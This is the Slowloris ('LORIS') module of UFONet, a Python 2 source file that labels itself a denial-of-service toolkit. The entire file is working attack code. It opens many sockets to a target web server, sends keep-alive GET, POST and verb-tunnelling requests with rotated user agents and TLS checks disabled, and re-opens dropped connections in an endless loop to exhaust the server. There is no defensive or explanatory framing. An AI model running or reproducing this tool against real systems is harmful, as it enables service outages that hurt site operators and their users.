#!/usr/bin/env python 
# -*- coding: utf-8 -*-"
"""
UFONet - Denial of Service Toolkit - 2018 - by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import socket, random, ssl, re

# UFONet Slow HTTP requests (LORIS)
def setupSocket(self, ip):
    method = random.choice(self.methods)
    port = 80
    if ip.startswith('http://'):
       ip = ip.replace('http://','')
       port = 80
    elif ip.startswith('https://'):
       ip = ip.replace('https://','')
       port = 443
    self.user_agent = random.choice(self.agents).strip()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    if port == 443:
        sock = ssl.wrap_socket(sock, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_TLSv1)
    sock.connect((ip, port))
    if method == "GET":
        http_req = "GET / HTTP/1.1\r\nHost: "+str(ip)+"\r\nUser-Agent: "+str(self.user_agent)+"\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\n\r\n"
    elif method == "POST":
        http_req = "POST / HTTP/1.1\r\nHost: "+str(ip)+"\r\nUser-Agent: "+str(self.user_agent)+"\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\n\r\n"
    else:
        http_req = "POST / HTTP/1.1\r\nHost: "+str(ip)+"\r\nX-HTTP-Method: PUT\r\nUser-Agent: "+str(self.user_agent)+"\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\n\r\n" # "Verb Tunneling Abuse" -> [RFC2616]
    sock.sendall(http_req)
    resp = sock.recv(1280).split("\n")
    for l in resp:
        if "Location:" in l:
            try:
                ip = re.findall('https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+', l)[0] # extract new redirect url
                ip = socket.gethostbyname(ip)
            except:
                pass
    return sock, ip

def tractor(self, ip, requests): 
    n=0
    for i in range(requests): 
        n=n+1
        try:
            sock, ip = setupSocket(self, ip)
            print "[Info] LORIS: Firing 'tractor beam' ["+str(n)+"] -> Status: CONNECTED! (Keeping socket open in time...)"
        except:
            print "[Error] LORIS: Failed to engage with 'tractor beam' ["+str(n)+"]"
        self.sockets.append(sock)
    while True: # try to abuse HTTP Headers
        for sock in list(self.sockets):
            try: 
                sock, ip = setupSocket(self, ip)
            except socket.error:
                self.sockets.remove(sock)
        for i in range(requests - len(self.sockets)):
            print("[Info] LORIS: Re-opening closed 'tractor beam' -> Status: RE-LINKED!")
            sock, ip = setupSocket(self, ip)
            if sock:
                self.sockets.append(sock)

class LORIS(object):
    def __init__(self):
        self.sockets = []
        self.agents_file = 'core/txt/user-agents.txt' # set source path to retrieve user-agents
        self.agents = []
        f = open(self.agents_file)
        agents = f.readlines()
        f.close()
        for agent in agents:
            self.agents.append(agent)
        self.methods = ['GET', 'POST', 'X-METHOD'] # supported HTTP requests methods

    def attacking(self, target, requests):
        print "\n[Info] Slow HTTP requests (LORIS) is ready to fire: [" , requests, "tractor beams ]\n"
        try:
            ip = socket.gethostbyname(target)
        except:
            ip = target
        tractor(self, ip, requests) # attack with LORIS using threading
